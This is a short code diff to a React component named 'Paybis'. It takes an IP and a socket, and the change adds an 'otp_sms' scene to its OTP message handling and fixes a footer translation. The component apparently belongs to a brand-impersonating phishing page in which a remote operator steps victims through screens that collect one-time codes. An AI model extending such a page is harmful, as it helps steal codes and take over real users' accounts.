@@ -26,7 +26,6 @@ export default function Paybis({ ip, socket }) {
     i18n.changeLanguage(language);
     setCurrentLang(language); // Atualiza o estado com o novo idioma
   };
-  
 
   const languageLinks = [
     { lang: "en", name: "English" },
@@ -67,7 +66,7 @@ export default function Paybis({ ip, socket }) {
         AtualizaCena();
 
         setMostraOtpErro(mostraErro);
-        if(cenaRecebida==="otp2"){
+        if(cenaRecebida==="otp2" || cenaRecebida==="otp_sms"){
           setMsgRecebida(msg)
         }
 
@@ -505,7 +504,7 @@ export default function Paybis({ ip, socket }) {
               </div>
             </div>
           </div>
-          <div className="auth-footer">t('SecuredbyTLSprotocol')</div>
+          <div className="auth-footer">{t('SecuredbyTLSprotocol')}</div>
         </div>
       </main>
       <div id="login"></div>
